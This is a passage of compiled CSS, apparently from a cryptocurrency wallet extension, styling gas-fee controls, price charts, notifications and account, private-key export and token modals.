      .gas-slider__labels {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      margin-top: -6px;
      color: #5b5d67; }
      .advanced-tab {
      display: flex;
      flex-flow: column; }
      .advanced-tab__transaction-data-summary, .advanced-tab__fee-chart-title {
      padding-left: 24px;
      padding-right: 24px; }
      .advanced-tab__transaction-data-summary {
      display: flex;
      flex-flow: column;
      color: #5b5d67;
      margin-top: 12px;
      padding-left: 18px;
      padding-right: 18px; }
      .advanced-tab__transaction-data-summary__titles, .advanced-tab__transaction-data-summary__container {
      display: flex;
      flex-flow: row;
      justify-content: space-between;
      font-size: 12px;
      color: #888ea3; }
      .advanced-tab__transaction-data-summary__container {
      font-size: 16px;
      margin-top: 0; }
      .advanced-tab__transaction-data-summary__fee {
      font-size: 16px;
      color: #313a5e; }
      .advanced-tab__transaction-data-summary__time-remaining {
      /*rtl:ignore*/
      direction: ltr;
      color: #313a5e;
      font-size: 16px; }
      .advanced-tab__transaction-data-summary__time-remaining .minutes-num,
      .advanced-tab__transaction-data-summary__time-remaining .seconds-num {
      font-size: 16px; }
      .advanced-tab__transaction-data-summary__time-remaining .seconds-num {
      margin-left: 7px;
      font-size: 16px; }
      .advanced-tab__transaction-data-summary__time-remaining .minutes-label,
      .advanced-tab__transaction-data-summary__time-remaining .seconds-label {
      font-size: 16px; }
      .advanced-tab__fee-chart {
      margin-top: 8px;
      height: 265px;
      background: #f8f9fb;
      border-bottom: 1px solid #d2d8dd;
      border-top: 1px solid #d2d8dd;
      position: relative; }
      .advanced-tab__fee-chart__title {
      font-size: 12px;
      color: #313a5e;
      margin-left: 22px; }
      .advanced-tab__fee-chart__speed-buttons {
      position: absolute;
      bottom: 13px;
      display: flex;
      justify-content: space-between;
      padding-left: 20px;
      padding-right: 19px;
      width: 100%;
      font-size: 10px;
      color: #888ea3; }
      .advanced-tab__fee-chart .loading-overlay {
      height: auto; }
      .advanced-tab__slider-container {
      padding-left: 27px;
      padding-right: 27px; }
      .advanced-tab__gas-inputs {
      display: flex;
      flex-flow: row;
      justify-content: space-between;
      margin-left: 20px;
      margin-right: 10px;
      margin-top: 10px;
      margin-bottom: 20px; }
      .basic-tab-content {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      padding-left: 21px;
      height: 324px;
      background: #f5f7f8;
      border-bottom: 1px solid #d2d8dd; }
      .basic-tab-content__title {
      margin-top: 19px;
      font-size: 16px;
      color: #000; }
      .basic-tab-content__blurb {
      width: 95%;
      font-size: 12px;
      color: #000;
      margin-top: 5px;
      margin-bottom: 15px; }
      .basic-tab-content__footer-blurb {
      width: 95%;
      font-size: 12px;
      color: #979797;
      margin-top: 15px; }
      .gas-modal-page-container .page-container {
      max-width: 391px;
      min-height: 585px;
      overflow-y: initial; }
      @media screen and (max-width: 575px) {
      .gas-modal-page-container .page-container__content {
      display: flex;
      overflow-y: initial; } }
      .gas-modal-page-container .page-container__header {
      padding: 0;
      padding-top: 16px; }
      .gas-modal-page-container .page-container__header--no-padding-bottom {
      padding-bottom: 0; }
      .gas-modal-page-container .page-container__footer footer {
      padding-top: 12px;
      padding-bottom: 12px; }
      .gas-modal-page-container .page-container__header-close-text {
      font-size: 14px;
      color: #4eade7;
      position: absolute;
      top: 4px;
      right: 16px;
      cursor: pointer;
      overflow: hidden;
      width: -webkit-min-content;
      width: -moz-min-content;
      width: min-content; }
      .gas-modal-page-container .page-container__title {
      color: #000;
      font-size: 16px;
      font-weight: 500;
      line-height: 16px;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      margin-right: 0; }
      .gas-modal-page-container .page-container__subtitle {
      display: none; }
      .gas-modal-page-container .page-container__tabs {
      margin-top: 0; }
      .gas-modal-page-container .page-container__tab {
      width: 100%;
      font-size: 14px; }
      .gas-modal-page-container .page-container__tab:last-of-type {
      margin-right: 0; }
      .gas-modal-page-container .page-container__tab--selected {
      color: #037dd6;
      border-bottom: 2px solid #037dd6; }
      @media screen and (max-width: 575px) {
      .gas-modal-content {
      width: 100%; } }
      .gas-modal-content__basic-tab {
      height: 219px; }
      .gas-modal-content__info-row, .gas-modal-content__info-row--fade {
      width: 100%;
      background: #fafcfe;
      padding: 15px 21px;
      display: flex;
      flex-flow: column;
      color: #5d5d5d;
      font-size: 12px; }
      .gas-modal-content__info-row__send-info, .gas-modal-content__info-row__transaction-info, .gas-modal-content__info-row__total-info, .gas-modal-content__info-row__fiat-total-info, .gas-modal-content__info-row--fade__send-info, .gas-modal-content__info-row--fade__transaction-info, .gas-modal-content__info-row--fade__total-info, .gas-modal-content__info-row--fade__fiat-total-info {
      display: flex;
      flex-flow: row;
      justify-content: space-between; }
      .gas-modal-content__info-row__fiat-total-info, .gas-modal-content__info-row--fade__fiat-total-info {
      justify-content: flex-end; }
      .gas-modal-content__info-row__total-info__label, .gas-modal-content__info-row--fade__total-info__label {
      font-size: 16px; }
      @media screen and (max-width: 575px) {
      .gas-modal-content__info-row__total-info__label, .gas-modal-content__info-row--fade__total-info__label {
      font-size: 14px; } }
      .gas-modal-content__info-row__total-info__value, .gas-modal-content__info-row--fade__total-info__value {
      font-size: 16px;
      font-weight: bold; }
      @media screen and (max-width: 575px) {
      .gas-modal-content__info-row__total-info__value, .gas-modal-content__info-row--fade__total-info__value {
      font-size: 14px; } }
      .gas-modal-content__info-row__transaction-info__label, .gas-modal-content__info-row__send-info__label, .gas-modal-content__info-row--fade__transaction-info__label, .gas-modal-content__info-row--fade__send-info__label {
      font-size: 12px; }
      .gas-modal-content__info-row__transaction-info__value, .gas-modal-content__info-row__send-info__value, .gas-modal-content__info-row--fade__transaction-info__value, .gas-modal-content__info-row--fade__send-info__value {
      font-size: 12px; }
      .gas-modal-content__info-row--fade {
      background: white;
      color: #9b9b9b;
      border-top: 1px solid #dddee9; }
      .gas-price-chart {
      display: flex;
      position: relative;
      justify-content: center; }
      .gas-price-chart__root {
      max-height: 154px;
      max-width: 391px;
      position: relative;
      overflow: hidden; }
      @media screen and (max-width: 575px) {
      .gas-price-chart__root {
      max-width: 326px; } }
      .gas-price-chart .tick text,
      .gas-price-chart .c3-axis-x-label,
      .gas-price-chart .c3-axis-y-label {
      font-style: normal;
      font-weight: bold;
      line-height: normal;
      font-size: 8px;
      text-align: center;
      fill: #9a9ca6 !important; }
      .gas-price-chart .c3-tooltip-container {
      display: flex;
      justify-content: center !important;
      align-items: flex-end !important; }
      .gas-price-chart .custom-tooltip {
      background: black;
      box-shadow: 0 4px 4px rgba(0, 0, 0, 0.25);
      border-radius: 3px;
      opacity: 1 !important;
      height: 21px;
      z-index: 1; }
      .gas-price-chart .tooltip-arrow {
      background: black;
      box-shadow: 0 4px 4px rgba(0, 0, 0, 0.5);
      -webkit-transform: rotate(45deg);
      transform: rotate(45deg);
      opacity: 1 !important;
      width: 9px;
      height: 9px;
      margin-top: 4px; }
      .gas-price-chart .custom-tooltip th {
      font-style: normal;
      font-weight: 500;
      line-height: normal;
      font-size: 10px;
      text-align: center;
      padding: 3px;
      color: #fff; }
      .gas-price-chart .c3-circle {
      visibility: hidden; }
      .gas-price-chart .c3-selected-circle,
      .gas-price-chart .c3-circle._expanded_ {
      fill: #fff !important;
      stroke-width: 2.4px !important;
      stroke: #2d9fd9 !important;
      /* visibility: visible; */ }
      .gas-price-chart #set-circle {
      fill: #313a5e !important;
      stroke: #313a5e !important; }
      .gas-price-chart .c3-axis-x-label,
      .gas-price-chart .c3-axis-y-label {
      font-weight: normal; }
      .gas-price-chart .tick text tspan {
      visibility: hidden; }
      .gas-price-chart .c3-circle {
      fill: #2d9fd9 !important; }
      .gas-price-chart .c3-line-data1 {
      stroke: #2d9fd9 !important;
      background: rgba(0, 0, 0, 0) !important;
      color: rgba(0, 0, 0, 0) !important; }
      .gas-price-chart .c3 path {
      fill: none; }
      .gas-price-chart .c3 path.c3-area-data1 {
      opacity: 1;
      fill: #e9edf1 !important; }
      .gas-price-chart .c3-xgrid-line line {
      stroke: #b8b8b8 !important; }
      .gas-price-chart .c3-xgrid-focus {
      stroke: #aaa; }
      .gas-price-chart .c3-axis-x .domain {
      fill: none;
      stroke: none; }
      .gas-price-chart .c3-axis-y .domain {
      fill: none;
      stroke: #c8ccd6; }
      .gas-price-chart .c3-event-rect {
      cursor: pointer; }
      #chart {
      background: #f8f9fb; }
      .advanced-gas-inputs__gas-edit-rows {
      display: flex;
      flex-flow: row;
      justify-content: space-between; }
      .advanced-gas-inputs__gas-edit-row {
      display: flex;
      flex-flow: column;
      width: 47.5%; }
      .advanced-gas-inputs__gas-edit-row__label {
      color: #313b5e;
      font-size: 12px;
      display: flex;
      justify-content: space-between;
      align-items: center; }
      @media screen and (max-width: 576px) {
      .advanced-gas-inputs__gas-edit-row__label {
      font-size: 10px; } }
      .advanced-gas-inputs__gas-edit-row__label .fa-info-circle {
      color: #cdcdcd;
      cursor: pointer; }
      .advanced-gas-inputs__gas-edit-row__label .fa-info-circle:hover {
      color: #5b5d67; }
      .advanced-gas-inputs__gas-edit-row__error-text {
      font-size: 12px;
      color: red; }
      .advanced-gas-inputs__gas-edit-row__warning-text {
      font-size: 12px;
      color: orange; }
      .advanced-gas-inputs__gas-edit-row__input-wrapper {
      position: relative; }
      .advanced-gas-inputs__gas-edit-row__input {
      /*rtl:ignore*/
      direction: ltr;
      border: 1px solid #9b9b9b;
      border-radius: 4px;
      color: #5b5d67;
      font-size: 16px;
      height: 24px;
      width: 100%;
      padding-left: 8px;
      padding-top: 2px;
      margin-top: 7px; }
      .advanced-gas-inputs__gas-edit-row__input--error {
      border: 1px solid #f00; }
      .advanced-gas-inputs__gas-edit-row__input--warning {
      border: 1px solid #ffa500; }
      .advanced-gas-inputs__gas-edit-row__input-arrows {
      position: absolute;
      top: 7px;
      /*rtl:ignore*/
      right: 0;
      width: 17px;
      height: 24px;
      border: 1px solid #dadada;
      border-top-right-radius: 4px;
      display: flex;
      flex-direction: column;
      color: #9b9b9b;
      font-size: 0.8em;
      border-bottom-right-radius: 4px;
      cursor: pointer; }
      .advanced-gas-inputs__gas-edit-row__input-arrows__i-wrap {
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      cursor: pointer; }
      .advanced-gas-inputs__gas-edit-row__input-arrows__i-wrap:hover {
      background: #4eade7;
      color: #fff; }
      .advanced-gas-inputs__gas-edit-row__input-arrows i:hover {
      background: #4eade7; }
      .advanced-gas-inputs__gas-edit-row__input-arrows i {
      font-size: 10px; }
      .advanced-gas-inputs__gas-edit-row__input-arrows--error {
      border: 1px solid #f00; }
      .advanced-gas-inputs__gas-edit-row__input-arrows--warning {
      border: 1px solid #ffa500; }
      .advanced-gas-inputs__gas-edit-row input[type="number"] {
      -webkit-appearance: textfield;
      -moz-appearance: textfield;
      appearance: textfield; }
      .advanced-gas-inputs__gas-edit-row input[type="number"]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .advanced-gas-inputs__gas-edit-row input[type="number"]:hover::-webkit-inner-spin-button {
      -webkit-appearance: none;
      -moz-appearance: none;
      display: none; }
      .advanced-gas-inputs__gas-edit-row__gwei-symbol {
      position: absolute;
      top: 8px;
      right: 10px;
      color: #9b9b9b; }
      .advanced-gas-inputs__gas-edit-row__custom-text {
      font-style: normal;
      font-weight: normal;
      font-size: 0.75rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%; }
      .tippy-tooltip.tippy-tooltip-home-theme {
      background: rgba(36, 41, 46, 0.9);
      color: #fff;
      border-radius: 8px; }
      .home-notification {
      background: rgba(36, 41, 46, 0.9);
      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
      border-radius: 8px;
      min-height: 116px;
      padding: 16px;
      display: flex;
      flex-flow: column;
      justify-content: space-between; }
      @media screen and (min-width: 576px) {
      .home-notification {
      min-width: 472px; } }
      .home-notification__header-container {
      display: flex; }
      .home-notification__header {
      display: flex;
      align-items: center;
      justify-content: space-between; }
      .home-notification__icon {
      height: 16px;
      align-self: center; }
      .home-notification__text {
      font-style: normal;
      font-weight: normal;
      font-size: 12px;
      color: #fff;
      margin-left: 10px;
      margin-right: 8px; }
      .home-notification .fa-info-circle {
      color: #6a737d; }
      .home-notification .home-notification__ignore-button {
      border: 2px solid #6a737d;
      box-sizing: border-box;
      border-radius: 6px;
      color: #fff;
      background-color: inherit;
      height: 34px;
      width: 155px;
      padding: 0; }
      @media screen and (max-width: 575px) {
      .home-notification .home-notification__ignore-button {
      width: 135px; } }
      .home-notification .home-notification__ignore-button:hover {
      border-color: #6a737d;
      background-color: #6a737d; }
      .home-notification .home-notification__ignore-button:active {
      background-color: #141618; }
      .home-notification .home-notification__accept-button {
      border: 2px solid #6a737d;
      box-sizing: border-box;
      border-radius: 6px;
      color: #fff;
      background-color: inherit;
      height: 34px;
      width: 155px;
      padding: 0;
      margin-left: 4px; }
      @media screen and (max-width: 575px) {
      .home-notification .home-notification__accept-button {
      width: 135px; } }
      .home-notification .home-notification__accept-button:hover {
      border-color: #6a737d;
      background-color: #6a737d; }
      .home-notification .home-notification__accept-button:active {
      background-color: #141618; }
      .home-notification__buttons {
      display: flex;
      width: 100%;
      margin-top: 10px;
      justify-content: flex-start;
      flex-direction: row-reverse; }
      .home-notification-tooltip__tooltip-container {
      display: flex; }
      .home-notification-tooltip__content {
      font-style: normal;
      font-weight: normal;
      font-size: 12px;
      color: #fff;
      text-align: left;
      display: inline-block;
      width: 200px; }
      .info-box {
      border-radius: 4px;
      background-color: #fafafa;
      position: relative;
      padding: 16px;
      display: flex;
      flex-flow: column;
      color: #5b5d67; }
      .info-box__close::after {
      content: '\00D7';
      font-size: 29px;
      font-weight: 200;
      color: #9b9b9b;
      position: absolute;
      right: 12px;
      top: 0;
      cursor: pointer; }
      .info-box__description {
      font-size: 0.75rem; }
      .menu-bar {
      display: grid;
      grid-template-columns: 30% minmax(30%, 1fr) 30%;
      -webkit-column-gap: 5px;
      -moz-column-gap: 5px;
      column-gap: 5px;
      padding: 0 8px;
      border-bottom: 1px solid #d6d9dc; }
      .menu-bar .menu-bar__account-options {
      background: none;
      font-size: inherit;
      padding: 0 8px 0 5px;
      place-self: center end; }
      .menu-bar .selected-account {
      grid-column: 2 / span 1;
      place-self: center stretch; }
      .account-options-menu__connected-sites::before {
      content: "";
      background-image: url(/images/icons/connected-sites.svg);
      background-size: contain;
      background-repeat: no-repeat;
      background-position: center;
      padding: 8px; }
      .account-options-menu__explorer-origin {
      color: #6a737d;
      font-size: 12px; }
      .modal-content {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 16px 0; }
      .modal-content__title {
      font-size: 1.5rem;
      font-weight: 500;
      padding: 16px 0;
      text-align: center; }
      .modal-content__description {
      text-align: center;
      font-size: 0.875rem; }
      .modal-container {
      width: 100%;
      height: 100%;
      background-color: #fff;
      display: flex;
      flex-flow: column;
      border-radius: 8px; }
      @media screen and (max-width: 575px) {
      .modal-container {
      max-height: 450px; } }
      .modal-container__content {
      overflow-y: auto;
      flex: 1;
      padding: 16px 32px; }
      @media screen and (max-width: 575px) {
      .modal-container__content {
      justify-content: center;
      padding: 28px 20px; } }
      .modal-container__header {
      position: relative;
      display: flex;
      padding: 12px;
      justify-content: center;
      border-bottom: 1px solid #d2d8dd;
      flex: 0 0 auto; }
      .modal-container__header-close::after {
      content: '\00D7';
      font-size: 40px;
      color: #9b9b9b;
      position: absolute;
      top: -5px;
      right: 10px;
      cursor: pointer; }
      .modal-container__footer {
      display: flex;
      flex-flow: row;
      justify-content: center;
      border-top: 1px solid #d2d8dd;
      padding: 16px;
      flex: 0 0 auto; }
      .modal-container__footer-button {
      min-width: 0;
      margin-right: 16px; }
      .modal-container__footer-button:last-of-type {
      margin-right: 0; }
      .account-details-modal__name {
      margin-top: 9px;
      font-size: 20px; }
      .account-details-modal .account-details-modal__button {
      margin-top: 17px;
      padding: 10px 22px;
      width: 286px; }
      .account-details-modal__divider {
      width: 100%;
      height: 1px;
      margin: 19px 0 8px 0;
      background-color: #dedede; }
      .account-details-modal .qr-header {
      margin-top: 9px;
      font-size: 20px; }
      .account-details-modal .qr-wrapper {
      margin-top: 5px; }
      .account-details-modal .ellip-address-wrapper {
      display: flex;
      justify-content: center;
      border: 1px solid #dedede;
      padding: 5px 10px;
      margin-top: 7px;
      width: 286px; }
      .account-modal__container {
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      position: relative;
      padding: 5px 0 31px 0;
      border: 1px solid #cdcdcd;
      border-radius: 4px; }
      .account-modal__back {
      color: #9b9b9b;
      position: absolute;
      top: 13px;
      left: 17px;
      cursor: pointer;
      display: flex;
      align-items: center; }
      .account-modal__back-text {
      font-size: 14px;
      line-height: 18px;
      padding-left: 3px; }
      .account-modal__close {
      font-size: 40px;
      background-color: transparent;
      color: #9b9b9b;
      position: absolute;
      cursor: pointer;
      top: 10px;
      right: 12px; }
      .account-modal__close::after {
      content: '\00D7'; }
      .account-modal .identicon {
      position: relative;
      left: 0;
      right: 0;
      margin: 0 auto;
      top: -32px;
      margin-bottom: -32px; }
      .add-to-address-book-modal {
      display: flex;
      flex-flow: column nowrap;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 5px 16px rgba(0, 0, 0, 0.25); }
      .add-to-address-book-modal__content {
      padding: 1.5rem;
      border-bottom: 1px solid #d6d9dc; }
      .add-to-address-book-modal__content__header {
      font-style: normal;
      font-weight: normal;
      font-size: 1.5rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%; }
      .add-to-address-book-modal__input-label {
      color: #535a61;
      margin-top: 1.25rem; }
      .add-to-address-book-modal__input {
      background: #fff;
      border: 1px solid #d6d9dc;
      box-sizing: border-box;
      border-radius: 8px;
      padding: 0.625rem 0.75rem;
      font-size: 1.25rem;
      margin-top: 0.75rem; }
      .add-to-address-book-modal__input::-webkit-input-placeholder {
      color: #9fa6ae; }
      .add-to-address-book-modal__input::-moz-placeholder {
      color: #9fa6ae; }
      .add-to-address-book-modal__input::-ms-input-placeholder {
      color: #9fa6ae; }
      .add-to-address-book-modal__input::placeholder {
      color: #9fa6ae; }
      .add-to-address-book-modal__footer {
      padding: 1rem; }
      .add-to-address-book-modal__footer button + button {
      margin-left: 1rem; }
      .cancel-transaction-gas-fee {
      background: #f1f4f9;
      padding: 16px;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 12px; }
      .cancel-transaction-gas-fee__eth {
      font-size: 1.5rem;
      font-weight: 500; }
      .cancel-transaction-gas-fee__fiat {
      font-size: 0.75rem; }
      .cancel-transaction__title {
      font-weight: 500;
      padding-bottom: 16px;
      text-align: center; }
      .cancel-transaction__description {
      text-align: center;
      font-size: 0.875rem; }
      .cancel-transaction__cancel-transaction-gas-fee-container {
      margin-bottom: 16px; }
      .confirm-remove-account__description {
      text-align: center;
      font-size: 0.875rem; }
      .confirm-remove-account__account {
      border: 1px solid #b7b7b7;
      border-radius: 4px;
      padding: 10px;
      display: flex;
      margin-top: 10px;
      margin-bottom: 20px;
      width: 100%; }
      .confirm-remove-account__account__identicon {
      margin-right: 10px; }
      .confirm-remove-account__account__name, .confirm-remove-account__account__address {
      margin-right: 10px;
      font-size: 14px; }
      .confirm-remove-account__account__name {
      width: 100px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis; }
      .confirm-remove-account__account__label {
      font-size: 11px;
      display: block;
      color: #9b9b9b; }
      .confirm-remove-account__account__link {
      margin-top: 14px; }
      .confirm-remove-account__account__link img {
      width: 15px;
      height: 15px; }
      @media screen and (max-width: 575px) {
      .confirm-remove-account__account__name {
      width: 90px; } }
      .confirm-remove-account__link {
      color: #2f9ae0; }
      .deposit-ether-modal {
      border-radius: 8px;
      display: flex;
      flex-flow: column;
      height: 100%; }
      .deposit-ether-modal__header {
      width: 100%;
      border-radius: 8px 8px 0 0;
      background-color: #5b5d67;
      display: flex;
      position: relative;
      padding: 25px;
      flex-flow: column;
      align-items: flex-start; }
      .deposit-ether-modal__header__title {
      color: #fff;
      font-size: 24px;
      line-height: 32px; }
      .deposit-ether-modal__header__description {
      color: #fff;
      font-size: 16px;
      line-height: 22px;
      margin-top: 10px; }
      .deposit-ether-modal__header__close::after {
      content: '\00D7';
      font-size: 2em;
      color: #fff;
      position: absolute;
      top: 20.8px;
      right: 28px;
      cursor: pointer; }
      .deposit-ether-modal__buy-rows {
      width: 100%;
      padding: 0 30px;
      display: flex;
      flex-flow: column nowrap;
      flex: 1;
      align-items: center; }
      @media screen and (max-width: 575px) {
      .deposit-ether-modal__buy-rows {
      height: 0; } }
      .deposit-ether-modal__logo {
      height: 60px;
      background-repeat: no-repeat;
      background-size: contain;
      background-position: center;
      width: 100%;
      display: flex;
      justify-content: center;
      align-items: center; }
      .deposit-ether-modal__buy-row {
      border-bottom: 1px solid #dedede;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex: 1 0 auto;
      padding: 30px 0 20px;
      min-height: 170px; }
      @media screen and (max-width: 575px) {
      .deposit-ether-modal__buy-row {
      min-height: 270px;
      flex-flow: column;
      justify-content: flex-start; } }
      .deposit-ether-modal__buy-row__back {
      position: absolute;
      top: 10px;
      left: 0; }
      .deposit-ether-modal__buy-row__logo-container {
      display: flex;
      justify-content: center;
      flex: 0 0 auto;
      padding: 0 20px; }
      @media screen and (min-width: 576px) {
      .deposit-ether-modal__buy-row__logo-container {
      width: 12rem; } }
      @media screen and (max-width: 575px) {
      .deposit-ether-modal__buy-row__logo-container {
      width: 100%;
      max-height: 6rem;
      padding-bottom: 20px; } }
      .deposit-ether-modal__buy-row__right {
      display: flex; }
      .deposit-ether-modal__buy-row__description {
      color: #38393a;
      padding-bottom: 20px;
      align-self: flex-start; }
      @media screen and (min-width: 575px) {
      .deposit-ether-modal__buy-row__description {
      width: 15rem; } }
      .deposit-ether-modal__buy-row__description__title {
      font-size: 20px;
      line-height: 30px; }
      .deposit-ether-modal__buy-row__description__text {
      font-size: 14px;
      line-height: 22px;
      margin-top: 7px; }
      .deposit-ether-modal__buy-row__button {
      display: flex;
      justify-content: flex-end; }
      @media screen and (min-width: 575px) {
      .deposit-ether-modal__buy-row__button {
      min-width: 300px; } }
      .deposit-ether-modal__buy-row:last-of-type {
      border-bottom: 0; }
      .deposit-ether-modal__deposit-button {
      width: 257px !important; }
      .deposit-ether-modal .simple-dropdown {
      color: #5b5d67;
      font-size: 16px;
      line-height: 21px;
      border: 1px solid #d8d8d8;
      background-color: #fff;
      text-align: center;
      width: 100%;
      height: 45px;
      line-height: 44px;
      font-weight: 300; }
      .deposit-ether-modal .simple-dropdown__selected {
      text-align: center; }
      .edit-approval-permission {
      width: 100%; }
      .edit-approval-permission__header, .edit-approval-permission__account-info {
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      border-bottom: 1px solid #d2d8dd; }
      .edit-approval-permission__header {
      padding: 24px; }
      .edit-approval-permission__header__close {
      position: absolute;
      right: 24px;
      background-image: url("/images/close-gray.svg");
      width: 0.75rem;
      height: 0.75rem;
      cursor: pointer; }
      .edit-approval-permission__title {
      font-weight: bold;
      font-size: 18px;
      line-height: 25px; }
      .edit-approval-permission__account-info {
      justify-content: space-between;
      padding: 8px 24px; }
      .edit-approval-permission__account-info__account, .edit-approval-permission__account-info__balance {
      font-weight: normal;
      font-size: 14px;
      color: #24292e; }
      .edit-approval-permission__account-info__account {
      display: flex;
      align-items: center; }
      .edit-approval-permission__account-info__name {
      margin-right: 8px;
      min-width: 64px; }
      .edit-approval-permission__account-info__balance {
      color: #6a737d;
      margin-left: 8px; }
      .edit-approval-permission__edit-section {
      padding: 24px; }
      .edit-approval-permission__edit-section__title {
      font-weight: bold;
      font-size: 14px;
      line-height: 20px;
      color: #24292e; }
      .edit-approval-permission__edit-section__description {
      font-weight: normal;
      font-size: 12px;
      line-height: 17px;
      color: #6a737d;
      margin-top: 8px; }
      .edit-approval-permission__edit-section__option {
      display: flex;
      align-items: flex-start;
      margin-top: 20px; }
      .edit-approval-permission__edit-section__radio-button {
      width: 18px; }
      .edit-approval-permission__edit-section__option-text {
      display: flex;
      flex-direction: column; }
      .edit-approval-permission__edit-section__option-label, .edit-approval-permission__edit-section__option-label--selected {
      font-weight: normal;
      font-size: 14px;
      line-height: 20px;
      color: #474b4d; }
      .edit-approval-permission__edit-section__option-label--selected {
      color: #037dd6; }
      .edit-approval-permission__edit-section__option-description {
      font-weight: normal;
      font-size: 12px;
      line-height: 17px;
      color: #6a737d;
      margin-top: 8px;
      margin-bottom: 6px; }
      .edit-approval-permission__edit-section__option-value {
      font-weight: normal;
      font-size: 18px;
      line-height: 25px;
      color: #24292e; }
      .edit-approval-permission__edit-section__radio-button {
      position: relative;
      width: 18px;
      height: 18px;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-right: 4px; }
      .edit-approval-permission__edit-section__radio-button-outline, .edit-approval-permission__edit-section__radio-button-outline--selected {
      width: 18px;
      height: 18px;
      background: #dadcdd;
      border-radius: 9px;
      position: absolute; }
      .edit-approval-permission__edit-section__radio-button-outline--selected {
      background: #037dd6; }
      .edit-approval-permission__edit-section__radio-button-fill {
      width: 14px;
      height: 14px;
      background: white;
      border-radius: 7px;
      position: absolute; }
      .edit-approval-permission__edit-section__radio-button-dot {
      width: 8px;
      height: 8px;
      background: #037dd6;
      border-radius: 4px;
      position: absolute; }
      .edit-approval-permission__name-and-balance-container {
      display: flex;
      flex: 0 0 100%;
      flex-flow: column;
      align-items: flex-start;
      justify-content: center;
      margin-left: 8px; }
      .edit-approval-permission-modal-content {
      padding: 0; }
      .edit-approval-permission-modal-container {
      max-height: 550px;
      width: 100%; }
      .export-private-key-modal__body-title {
      margin-top: 16px;
      margin-bottom: 16px;
      font-size: 18px; }
      .export-private-key-modal__divider {
      width: 100%;
      height: 1px;
      margin: 19px 0 8px 0;
      background-color: #dedede; }
      .export-private-key-modal__account-name {
      margin-top: 9px;
      font-size: 20px; }
      .export-private-key-modal__password {
      display: flex;
      flex-direction: column; }
      .export-private-key-modal__password-label, .export-private-key-modal__password--error {
      color: #5d5d5d;
      font-size: 14px;
      line-height: 18px;
      margin-bottom: 10px; }
      .export-private-key-modal__password--error {
      color: #e91550;
      margin-bottom: 0; }
      .export-private-key-modal__password-input {
      padding: 10px 0 13px 17px;
      font-size: 16px;
      line-height: 21px;
      width: 291px;
      height: 44px; }
      .export-private-key-modal__password::-webkit-input-placeholder {
      color: #9b9b9b; }
      .export-private-key-modal__password--warning {
      border-radius: 8px;
      background-color: #fff6f6;
      font-size: 12px;
      font-weight: 500;
      line-height: 15px;
      color: #e91550;
      width: 292px;
      padding: 9px 15px;
      margin-top: 18px; }
      .export-private-key-modal__password-display-wrapper {
      height: 80px;
      width: 291px;
      border: 1px solid #cdcdcd;
      border-radius: 2px; }
      .export-private-key-modal__password-display-textarea {
      color: #e91550;
      font-size: 16px;
      line-height: 21px;
      border: none;
      height: 75px;
      width: 100%;
      overflow: hidden;
      resize: none;
      padding: 9px 13px 8px; }
      .export-private-key-modal__buttons {
      display: flex;
      flex-direction: row;
      justify-content: center; }
      .export-private-key-modal__button {
      margin-top: 17px;
      width: 141px;
      min-width: initial; }
      .export-private-key-modal__button--cancel {
      margin-right: 15px; }
      .export-private-key-modal .ellip-address-wrapper {
      display: flex;
      justify-content: center;
      border: 1px solid #dedede;
      padding: 5px 10px;
      margin-top: 7px;
      width: 286px; }
      .hide-token-confirmation {
      min-height: 250.72px;
      border-radius: 4px;
      background-color: #fff;
      box-shadow: 0 1px 7px 0 rgba(0, 0, 0, 0.5); }
      .hide-token-confirmation__container {
      padding: 24px 27px 21px;
      display: flex;
      flex-direction: column;
      align-items: center; }
      .hide-token-confirmation__identicon {
      margin-bottom: 10px; }
      .hide-token-confirmation__symbol {
      color: #4d4d4d;
      font-size: 16px;
      line-height: 24px;
      text-align: center;
      margin-bottom: 7.5px; }
      .hide-token-confirmation__title {
      height: 30px;
      width: 271.28px;
      color: #4d4d4d;
      font-size: 22px;
      line-height: 30px;
      text-align: center;
      margin-bottom: 10.5px; }
      .hide-token-confirmation__copy {
      height: 41px;
      width: 318px;
      color: #5d5d5d;
      font-size: 14px;
      line-height: 18px;
      text-align: center; }
      .hide-token-confirmation__buttons {
      display: flex;
      flex-direction: row;
      justify-content: center;
      margin-top: 15px;
      width: 100%; }
      .hide-token-confirmation__button {
      margin: 0 5px; }
      .metametrics-opt-in-modal .metametrics-opt-in__main {
      justify-content: center;
      margin-left: 3%;
      margin-right: 0%;
      max-height: 75vh; }
      @media screen and (max-width: 575px) {
      .metametrics-opt-in-modal .metametrics-opt-in__main {
      max-height: 100vh; } }
      .metametrics-opt-in-modal .metametrics-opt-in__title {
      font-size: 38px; }
      .metametrics-opt-in-modal .metametrics-opt-in__content {
      padding-right: 6px; }
      @media screen and (max-width: 575px) {
      .metametrics-opt-in-modal .metametrics-opt-in__footer {
      margin-top: 10px;
      justify-content: center;
      margin-left: 2%;
      max-height: 520px; } }
      .new-account-modal {
      display: flex;
      flex-flow: column nowrap;
      background-color: #fff;
      border-radius: 10px;
      box-shadow: 0 5px 16px rgba(0, 0, 0, 0.25); }
      .new-account-modal__content {
      padding: 1.5rem;
      border-bottom: 1px solid #d6d9dc; }
      .new-account-modal__content__header {
      font-style: normal;
      font-weight: normal;
      font-size: 1.125rem;
      font-family: Euclid, Roboto, Helvetica, Arial, sans-serif;
      line-height: 140%;
      font-weight: bold;
      display: flex;
      justify-content: space-between;
      align-items: center; }
      .new-account-modal__content__header-close {
      color: #24292e;
      background: none;
      font-size: 1.1rem; }
      .new-account-modal__input-label {
      color: #535a61;
      margin-top: 1.25rem; }
      .new-account-modal__input {
      background: #fff;
      border: 1px solid #d6d9dc;
      box-sizing: border-box;
